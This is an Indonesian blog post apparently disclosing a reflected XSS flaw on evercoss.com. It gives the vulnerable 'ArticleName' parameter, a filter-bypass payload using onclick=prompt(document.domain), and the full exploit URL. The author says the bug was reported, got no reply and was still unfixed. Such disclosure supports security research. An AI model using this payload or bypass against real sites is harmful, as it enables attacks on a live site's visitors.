---
title: Reflected XSS at evercoss.com
author: mrhidden
date: "2020-02-25T02:38:00.000-08:00"
image: /assets/img/posts/2020/xss-evercoss/header.png
description: Temuan kerentanan Reflected Cross-Site Scripting (XSS) pada evercoss.com akibat validasi input yang lemah, disertai contoh payload dan proof of concept.
categories: [Blogging, Exploit]
tags: [xss]
---

Sebenarnya bug ini sudah lama saya temukan, dan juga sudah pernah saya report cuma ya gak ada tanggapan.

Bug ini saya temukan sekitar bulan 6 tahun lalu kalau gak salah, tapi saya coba lagi dan ternyata bug ini belum juga di perbaiki.

Ok sebelum lanjut membaca mohon baca dulu [DISCLAIMER](/disclaimer), jika sudah baca berarti anda setuju dengan apa yang saya tulis.

Bug ini terletak pada url http://evercoss.com/article?ArticleName= , nah disini saya mencoba memasukkan payload seperti biasa `<script>alert(1);</script>` tapi kefilter menjadi `\[removed\]alert(1);\[removed\]`

Kemudian saya coba bypass menggunakan payload seperti ini

```
" onclick=prompt(document.domain)//<button ‘ onclick=prompt(document.domain)//> \*/ prompt(document.domain)//
```

hingga menjadi menjadi seperti ini

```
http://evercoss.com/article?ArticleName=**" onclick=prompt(document.domain)//<button ‘ onclick=prompt(document.domain)//> \*/ prompt(document.domain)//**
```

Setelah saya memasukkan payload seperti ini timbul lah pop up xss tersebut

Jelasnya bisa lihat video dibawah

<figure>
  <iframe
    src="https://www.blogger.com/video.g?token=AD6v5dzebQLtKWhHGHHT5-cpfpNqsvENuKltH7jOLCLvR58k9EJGK_JU9jDXnpY4SS0Jqk3J-r_aA_wksvygpCiBDjqSBC-XjRG0ZFddj0S7bJAU1e1CYqrAVnAQlUxCsdrPIIle8JQ"
    width="100%"
    height="420"
    loading="lazy"
    allowfullscreen>
  </iframe>
</figure>
